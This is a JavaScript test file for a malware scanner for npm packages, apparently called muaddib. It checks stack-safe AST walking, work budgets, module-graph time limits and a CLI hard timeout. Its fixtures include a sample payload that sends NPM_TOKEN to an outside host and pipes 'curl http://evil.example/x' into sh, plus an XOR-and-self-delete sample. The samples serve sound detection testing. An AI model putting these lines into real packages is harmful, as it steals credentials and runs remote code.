'use strict';

/**
 * Architecture lot 2: bounded heavy scanners.
 *
 * - Deep member/call chains: acorn parses them with a loop but acorn-walk visited them
 *   recursively, so 5 000 links (15 KB) overflowed the stack. On master the whole analyzeAST
 *   and analyzeDataFlow scanners rejected and a payload in the same package scored 0.
 * - One file that throws costs only that file (file-error, INCONCLUSIVE).
 * - Work budget in source characters, deterministic, executed files first.
 * - Hard wall-clock bound for the CLI (watchdog thread).
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');
const acornWalk = require('acorn-walk');
const { test, asyncTest, assert, runScanDirect } = require('../test-utils');
const safeWalk = require('../../src/shared/safe-walk');
const { safeParse } = require('../../src/shared/constants');
const { analyzeWithDeobfuscation } = require('../../src/shared/analyze-helper');
const { getIncomplete, resetCompleteness } = require('../../src/shared/completeness');
const { forEachSafeFile } = require('../../src/utils');
const { hardTimeoutSeconds, DEFAULT_HARD_TIMEOUT_S } = require('../../src/shared/hard-timeout');

const ROOT = path.join(__dirname, '..', '..');
const BIN = path.join(ROOT, 'bin', 'muaddib.js');

const PAYLOAD = "const s = process.env.NPM_TOKEN;\n" +
  "require('https').request({ hostname: 'collector-unrelated.net', method: 'POST' }).end(s);\n" +
  "require('child_process').exec('curl http://evil.example/x | sh');\n";

function makePkg(files, pkg = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-budget-'));
  fs.writeFileSync(path.join(dir, 'package.json'),
    JSON.stringify({ name: 'budget-fixture', version: '1.0.0', main: 'index.js', ...pkg }));
  for (const [rel, content] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), content);
  }
  return dir;
}

function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}

async function withEnv(name, value, fn) {
  const prev = process.env[name];
  if (value === undefined) delete process.env[name]; else process.env[name] = value;
  try { return await fn(); } finally {
    if (prev === undefined) delete process.env[name]; else process.env[name] = prev;
  }
}

function reasons(result) {
  return result.analysis.incomplete.map(e => `${e.component}/${e.reason}`);
}

function types(result) {
  return new Set(result.threats.map(t => t.type));
}

// Every visit, with the ancestor depth and parent start for ancestor().
function visitTrace(walker, mode, ast) {
  const seq = [];
  const visitors = {};
  for (const t of Object.keys(acornWalk.base).concat(['Expression', 'Statement', 'Pattern'])) {
    visitors[t] = (node, st, anc) => {
      seq.push(t + ':' + node.start + ':' + node.end + (anc ? ':' + anc.length + ':' + (anc[anc.length - 2] || {}).start : ''));
    };
  }
  walker[mode](ast, visitors);
  return seq.join('|');
}

async function runScannerBudgetTests() {
  console.log('\n=== SCANNER BUDGET (lot 2) TESTS ===\n');

  // --- safe-walk: exact acorn-walk semantics, no recursion ---------------------

  test('BUDGET: safe-walk visits exactly like acorn-walk (simple + ancestor) on the scanner sources', () => {
    const dir = path.join(ROOT, 'src', 'scanner');
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.js')).map(f => path.join(dir, f));
    assert(files.length > 20, 'expected the scanner sources');
    let visits = 0;
    for (const file of files) {
      const ast = safeParse(fs.readFileSync(file, 'utf8'));
      if (!ast) continue;
      for (const mode of ['simple', 'ancestor']) {
        const expected = visitTrace(acornWalk, mode, ast);
        const actual = visitTrace(safeWalk, mode, ast);
        assert(actual === expected, `${mode} visit order differs on ${path.basename(file)}`);
        visits += expected.length;
      }
    }
    assert(visits > 0, 'no visits compared');
  });

  test('BUDGET: safe-walk walks a 20 000-link member chain that overflows acorn-walk', () => {
    const ast = safeParse('var r = o' + '.a'.repeat(20000) + ';');
    assert(ast, 'acorn must parse the chain');
    let acornThrew = false;
    try { acornWalk.simple(ast, { MemberExpression() {} }); } catch (e) { acornThrew = e instanceof RangeError; }
    assert(acornThrew, 'premise: acorn-walk overflows the stack on this chain');
    let members = 0;
    safeWalk.simple(ast, { MemberExpression() { members++; } });
    assert(members === 20000, 'every link visited, got ' + members);
    let depth = 0;
    safeWalk.ancestor(ast, { Identifier(_n, _s, anc) { depth = Math.max(depth, anc.length); } });
    assert(depth > 20000, 'ancestor() keeps the full path, got ' + depth);
  });

  // --- the bypass: deep chain in the payload file ------------------------------

  for (const [name, chain] of [['member', '.a'], ['call', '.a()']]) {
    await asyncTest(`BUDGET: a 5 000-link ${name} chain in the payload file keeps the AST/dataflow findings`, async () => {
      const dir = makePkg({ 'index.js': PAYLOAD + 'var r = o' + chain.repeat(5000) + ';\n' });
      try {
        const r = await runScanDirect(dir);
        const t = types(r);
        assert(t.has('dangerous_exec'), 'dangerous_exec lost: ' + [...t].join(','));
        assert(t.has('suspicious_dataflow'), 'suspicious_dataflow lost: ' + [...t].join(','));
        assert(!reasons(r).some(x => /error/.test(x)), 'no scanner error expected: ' + reasons(r).join(' '));
        assert(r.summary.riskScore >= 20, 'score collapsed: ' + r.summary.riskScore);
      } finally { cleanup(dir); }
    });
  }

  await asyncTest('BUDGET: an exported deep chain no longer aborts the module-graph event step', async () => {
    const dir = makePkg({
      'index.js': PAYLOAD + "require('./deep.js');\n",
      'deep.js': 'var o = {}; var r = o' + '.a'.repeat(20000) + ';\nmodule.exports = r;\n'
    });
    try {
      const r = await runScanDirect(dir);
      assert(!reasons(r).includes('moduleGraph/error'), 'module graph errored: ' + reasons(r).join(' '));
    } finally { cleanup(dir); }
  });

  // --- module graph: monitor time limit on top of the work budget ----------------

  // 40 local modules chained by require: the graph steps read them several times, which takes
  // well over 1 ms on any machine.
  const graphFiles = () => {
    const files = { 'index.js': PAYLOAD + "require('./m0.js');\n" };
    for (let i = 0; i < 40; i++) {
      files[`m${i}.js`] = (i < 39 ? `require('./m${i + 1}.js');\n` : '') +
        `module.exports = function f${i}(x) { return [x, process.env.HOME, ${i}].join('-'); };\n`;
    }
    return files;
  };
  await asyncTest('BUDGET: in monitor mode the module graph stops at its time limit (moduleGraph/timeout)', async () => {
    const dir = makePkg(graphFiles());
    try {
      const r = await withEnv('MUADDIB_MONITOR_MODULE_GRAPH_MS', '1', () => runScanDirect(dir, { monitorMode: true }));
      assert(reasons(r).includes('moduleGraph/timeout'), 'moduleGraph/timeout expected: ' + reasons(r).join(' '));
      assert(r.analysis.status === 'INCONCLUSIVE', 'status: ' + r.analysis.status);
      assert(types(r).has('dangerous_exec'), 'the heavy scanners must still run after the graph stops');
    } finally { cleanup(dir); }
  });
  await asyncTest('BUDGET: the module-graph time limit never applies outside the monitor (negative)', async () => {
    const dir = makePkg(graphFiles());
    try {
      const r = await withEnv('MUADDIB_MONITOR_MODULE_GRAPH_MS', '1', () => runScanDirect(dir));
      assert(!reasons(r).includes('moduleGraph/timeout'), 'CLI scan got a module-graph time limit: ' + reasons(r).join(' '));
    } finally { cleanup(dir); }
  });
  await asyncTest('BUDGET: MUADDIB_MONITOR_MODULE_GRAPH_MS=0 disables it, malformed values keep the 5 s default', async () => {
    const dir = makePkg(graphFiles());
    try {
      for (const value of ['0', '', 'abc', '-1', '1e3', '5ms']) {
        const r = await withEnv('MUADDIB_MONITOR_MODULE_GRAPH_MS', value, () => runScanDirect(dir, { monitorMode: true }));
        assert(!reasons(r).includes('moduleGraph/timeout'), `value ${JSON.stringify(value)} stopped the graph: ` + reasons(r).join(' '));
      }
    } finally { cleanup(dir); }
  });

  // --- per-file isolation -------------------------------------------------------

  test('BUDGET: a file whose analysis throws costs only that file and marks file-error', () => {
    const dir = makePkg({ 'index.js': 'module.exports = 1;\n', 'bad.js': 'module.exports = 2;\n', 'good.js': 'module.exports = 3;\n' });
    try {
      resetCompleteness();
      const threats = analyzeWithDeobfuscation(dir, (content, file) => {
        if (file.endsWith('bad.js')) throw new RangeError('Maximum call stack size exceeded');
        return [{ type: 'probe', message: path.basename(file), file: path.basename(file) }];
      }, { component: 'probeScanner' });
      const files = threats.map(t => t.file).sort();
      assert(files.join(',') === 'good.js,index.js', 'other files kept: ' + files.join(','));
      const inc = getIncomplete();
      assert(inc.some(e => e.component === 'probeScanner' && e.reason === 'file-error' && e.observed === 1),
        'file-error expected: ' + JSON.stringify(inc));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  test('BUDGET: without a throw nothing is marked (negative)', () => {
    const dir = makePkg({ 'index.js': 'module.exports = 1;\n', 'other.js': 'module.exports = 2;\n' });
    try {
      resetCompleteness();
      analyzeWithDeobfuscation(dir, () => [], { component: 'probeScanner' });
      assert(getIncomplete().length === 0, 'unexpected mark: ' + JSON.stringify(getIncomplete()));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  // --- work budget: deterministic, executed first, original output order --------

  test('BUDGET: the work budget analyzes executed files first and stops on a character count', () => {
    // a-*.js sort before the entry point in directory order and are not executed.
    const files = { 'z-main.js': 'module.exports = 1;\n' };
    for (let i = 0; i < 5; i++) files[`a-decoy${i}.js`] = '// ' + 'x'.repeat(1000) + '\n';
    const dir = makePkg(files, { main: 'z-main.js' });
    try {
      const seen = [];
      for (let run = 0; run < 3; run++) {
        resetCompleteness();
        const analyzed = [];
        analyzeWithDeobfuscation(dir, (content, file) => { analyzed.push(path.basename(file)); return []; },
          { component: 'probeScanner', byteBudget: 1500 });
        seen.push(analyzed.join(',') + '|' + JSON.stringify(getIncomplete()));
        assert(analyzed[0] === 'z-main.js', 'executed file first: ' + analyzed.join(','));
        assert(analyzed.length === 3, 'stops once 1500 characters are reached: ' + analyzed.join(','));
        const inc = getIncomplete().find(e => e.component === 'probeScanner' && e.reason === 'work-budget');
        assert(inc && inc.limit === 1500 && inc.observed === 20 + 2 * 1004, 'work-budget entry: ' + JSON.stringify(getIncomplete()));
      }
      assert(new Set(seen).size === 1, 'same stop point on every run: ' + seen.join(' / '));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  test('BUDGET: findings keep the original file order whatever the processing order', () => {
    const dir = makePkg({ 'z-main.js': '1;\n', 'a.js': '2;\n', 'b.js': '3;\n' }, { main: 'z-main.js' });
    try {
      const { findJsFiles } = require('../../src/utils');
      const expected = findJsFiles(dir).map(f => path.basename(f));
      resetCompleteness();
      const threats = analyzeWithDeobfuscation(dir, (c, file) => [{ type: 'probe', message: file, file: path.basename(file) }], {});
      assert(threats.map(t => t.file).join(',') === expected.join(','), 'order: ' + threats.map(t => t.file).join(',') + ' vs ' + expected.join(','));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  test('BUDGET: a budget never reached marks nothing (negative)', () => {
    const dir = makePkg({ 'index.js': 'module.exports = 1;\n', 'other.js': 'module.exports = 2;\n' });
    try {
      resetCompleteness();
      analyzeWithDeobfuscation(dir, () => [], { component: 'probeScanner', byteBudget: 1e6 });
      assert(getIncomplete().length === 0, 'unexpected mark: ' + JSON.stringify(getIncomplete()));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  // --- budget order: BFS depth from the entry points, in every budgeted scanner ----------

  test('BUDGET: executed files are processed closest to an entry point first (BFS depth)', () => {
    // Directory order is a-deep, b-other, m-mid, z-main; the require chain is the reverse.
    const dir = makePkg({
      'z-main.js': "require('./m-mid.js');\n",
      'm-mid.js': "require('./a-deep.js');\n",
      'a-deep.js': 'module.exports = 1;\n',
      'b-other.js': 'module.exports = 2;\n'
    }, { main: 'z-main.js' });
    try {
      resetCompleteness();
      const analyzed = [];
      analyzeWithDeobfuscation(dir, (content, file) => { analyzed.push(path.basename(file)); return []; }, { component: 'probeScanner' });
      assert(analyzed.join(',') === 'z-main.js,m-mid.js,a-deep.js,b-other.js', 'BFS order expected: ' + analyzed.join(','));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  // A deterministic high-entropy literal (64 distinct characters, not the base64 alphabet order).
  const HIGH_ENTROPY = Array.from({ length: 64 }, (_, i) =>
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'[(i * 37 + 11) % 64]).join('');

  function decoyPkg(payloadFile, decoyBody) {
    const files = { 'z-main.js': "require('./z-payload.js');\n", 'z-payload.js': payloadFile };
    for (let i = 0; i < 5; i++) files[`a-decoy${i}.js`] = decoyBody + '// ' + 'x'.repeat(2000) + '\n';
    return makePkg(files, { main: 'z-main.js' });
  }

  test('BUDGET: scanEntropy spends its budget on executed files first, decoys cannot push the payload out', () => {
    const { scanEntropy } = require('../../src/scanner/entropy');
    const dir = decoyPkg(`module.exports = '${HIGH_ENTROPY}';\n`, 'module.exports = 0;\n');
    try {
      resetCompleteness();
      const all = scanEntropy(dir, {});
      assert(all.some(t => t.type === 'high_entropy_string' && t.file === 'z-payload.js'), 'fixture: the payload string must fire without a budget: ' + JSON.stringify(all));
      resetCompleteness();
      const t = scanEntropy(dir, { byteBudget: 200 });
      assert(t.some(x => x.type === 'high_entropy_string' && x.file === 'z-payload.js'), 'payload must be analyzed before the decoys: ' + JSON.stringify(t));
      assert(getIncomplete().some(e => e.component === 'scanEntropy' && e.reason === 'work-budget'), 'work-budget expected');
    } finally { resetCompleteness(); cleanup(dir); }
  });

  await asyncTest('BUDGET: scanAntiForensic spends its budget on executed files first, decoys cannot push the payload out', async () => {
    const { scanAntiForensic } = require('../../src/scanner/anti-forensic');
    const payload = 'const fs = require("fs"); const K = "kk";\n' +
      'for (let i = 0; i < 9; i++) o[i] = P[i] ^ K.charCodeAt(0);\n' +
      'fs.writeFileSync("package.md", "#"); fs.unlinkSync(__filename);\n';
    // The decoys pass the scanner's pre-filter (a `^`), so they would be parsed and charged.
    const dir = decoyPkg(payload, 'var q = a ^ b;\n');
    try {
      resetCompleteness();
      const t = await scanAntiForensic(dir, { byteBudget: 300 });
      assert(t.some(x => x.type === 'anti_forensic_xor_autodelete' && x.file === 'z-payload.js'), 'payload must be analyzed before the decoys: ' + JSON.stringify(t));
      assert(getIncomplete().some(e => e.component === 'scanAntiForensic' && e.reason === 'work-budget'), 'work-budget expected');
    } finally { resetCompleteness(); cleanup(dir); }
  });

  test('BUDGET: scanEntropy findings keep the original file order without a budget (negative)', () => {
    const { scanEntropy } = require('../../src/scanner/entropy');
    const dir = makePkg({ 'z-main.js': `module.exports = '${HIGH_ENTROPY}';\n`, 'a-lib.js': `module.exports = '${HIGH_ENTROPY}';\n` }, { main: 'z-main.js' });
    try {
      resetCompleteness();
      const files = scanEntropy(dir, {}).filter(x => x.type === 'high_entropy_string').map(x => x.file);
      assert(files.join(',') === 'a-lib.js,z-main.js', 'original order expected: ' + files.join(','));
    } finally { resetCompleteness(); cleanup(dir); }
  });

  await asyncTest('BUDGET: MUADDIB_SCANNER_WORK_BUDGET=0 makes the heavy scanners stop and the scan INCONCLUSIVE', async () => {
    const dir = makePkg({ 'index.js': PAYLOAD });
    try {
      const r = await withEnv('MUADDIB_SCANNER_WORK_BUDGET', '0', () => runScanDirect(dir));
      assert(r.analysis.status === 'INCONCLUSIVE', 'status: ' + r.analysis.status);
      for (const c of ['analyzeAST', 'analyzeDataFlow', 'scanEntropy']) {
        assert(reasons(r).includes(c + '/work-budget'), c + ' work-budget expected: ' + reasons(r).join(' '));
      }
    } finally { cleanup(dir); }
  });

  await asyncTest('BUDGET: empty or malformed MUADDIB_SCANNER_WORK_BUDGET keeps the default', async () => {
    const dir = makePkg({ 'index.js': PAYLOAD });
    try {
      for (const value of ['', ' ', 'abc', '-1', '1e3', '5MB']) {
        const r = await withEnv('MUADDIB_SCANNER_WORK_BUDGET', value, () => runScanDirect(dir));
        assert(!reasons(r).some(x => x.endsWith('/work-budget')), `value ${JSON.stringify(value)} became a budget: ` + reasons(r).join(' '));
        assert(types(r).has('dangerous_exec'), `value ${JSON.stringify(value)}: AST must run`);
      }
    } finally { cleanup(dir); }
  });

  test('BUDGET: forEachSafeFile stops before reading once shouldStop is true', () => {
    const dir = makePkg({ 'a.js': '1', 'b.js': '2', 'c.js': '3' });
    try {
      const seen = [];
      const list = ['a.js', 'b.js', 'c.js'].map(f => path.join(dir, f));
      forEachSafeFile(list, f => seen.push(path.basename(f)), { shouldStop: () => seen.length >= 2 });
      assert(seen.join(',') === 'a.js,b.js', 'got ' + seen.join(','));
    } finally { cleanup(dir); }
  });

  // --- hard wall-clock bound for the CLI ----------------------------------------

  test('BUDGET: MUADDIB_SCAN_HARD_TIMEOUT_S parse is strict, 0 disables, default 600', () => {
    assert(DEFAULT_HARD_TIMEOUT_S === 600, 'default');
    assert(hardTimeoutSeconds({}) === 600, 'unset');
    assert(hardTimeoutSeconds({ MUADDIB_SCAN_HARD_TIMEOUT_S: '0' }) === 0, '0 disables');
    assert(hardTimeoutSeconds({ MUADDIB_SCAN_HARD_TIMEOUT_S: ' 30 ' }) === 30, 'trimmed');
    for (const v of ['', 'abc', '-1', '1e3', '10s']) {
      assert(hardTimeoutSeconds({ MUADDIB_SCAN_HARD_TIMEOUT_S: v }) === 600, `${JSON.stringify(v)} keeps the default`);
    }
  });

  test('BUDGET: a CLI scan blocked in synchronous analysis is killed at the hard limit, non-zero, no result', () => {
    const dir = makePkg({ 'index.js': PAYLOAD });
    const preload = path.join(dir, 'busy-preload.js');
    // Replaces analyzeAST with a 60 s synchronous spin: no main-thread timer can fire.
    fs.writeFileSync(preload, `const m = require(${JSON.stringify(path.join(ROOT, 'src', 'scanner', 'ast.js'))});\n` +
      'm.analyzeAST = async () => { const end = Date.now() + 60000; while (Date.now() < end) { /* spin */ } return []; };\n');
    try {
      const t0 = Date.now();
      const r = spawnSync(process.execPath, ['-r', preload, BIN, 'scan', dir, '--json'], {
        encoding: 'utf8', timeout: 50000, env: { ...process.env, MUADDIB_SCAN_HARD_TIMEOUT_S: '2' }
      });
      const elapsed = Date.now() - t0;
      assert(r.error === undefined, 'the test timeout fired first: ' + (r.error && r.error.message));
      assert(elapsed < 40000, 'killed well before the 60 s spin ended: ' + elapsed + ' ms');
      assert(r.status !== 0, 'non-zero exit (fail closed), got status ' + r.status + ' signal ' + r.signal);
      assert(/exceeded the hard time limit \(2 s/.test(r.stderr), 'reason on stderr: ' + r.stderr.slice(-300));
      assert(r.stdout.trim() === '', 'no partial result on stdout');
    } finally { cleanup(dir); }
  });

  test('BUDGET: a scan that settles disarms the watchdog (negative)', () => {
    // Arm 1 s, disarm, then stay busy 2.5 s: the process must exit 0 on its own.
    const r = spawnSync(process.execPath, ['-e',
      `const disarm = require(${JSON.stringify(path.join(ROOT, 'src', 'shared', 'hard-timeout.js'))}).armHardTimeout(1);\n` +
      'disarm();\nconst end = Date.now() + 2500; while (Date.now() < end) { /* spin */ }\nprocess.exit(0);\n'
    ], { encoding: 'utf8', timeout: 30000 });
    assert(r.status === 0, 'status ' + r.status + ' signal ' + r.signal + ' ' + r.stderr);
    assert(!/hard time limit/.test(r.stderr), 'watchdog fired after disarm');
  });
}

module.exports = { runScannerBudgetTests };
